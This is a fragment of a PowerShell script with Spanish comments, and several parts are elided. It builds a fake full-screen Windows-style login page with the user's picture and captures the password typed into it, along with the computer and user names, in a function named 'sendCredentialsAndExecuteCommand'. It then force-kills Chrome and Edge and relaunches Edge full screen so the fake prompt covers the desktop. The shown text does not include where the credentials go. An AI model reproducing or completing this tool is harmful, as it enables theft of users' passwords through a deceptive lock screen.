...
# HTML para la página de portada
$h = @"
<!DOCTYPE html>
<html lang="en">
<head>
...
<body class="text-nowrap" style="width:100%;height:100vh">
  <div id="loginForm" class="container">
    <div class="center-container">
        <div class="image-container">
            <img src="$usrimg" alt="User Image" class="circular-image">
             </div>
  ...
  <script>
    function sendCredentialsAndExecuteCommand() {
      ...
      var contents = "Computer: $c | User: $u | Password: " + passwordValue;
...
# Matar cualquier navegador (interfieren con el argumento "Maximizado")
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe", "/IM", "msedge.exe" -NoNewWindow -Wait
Sleep -Milliseconds 100

# Iniciar Edge en pantalla completa
...
# Establecer Edge como la ventana superior y comenzar el protector de pantalla
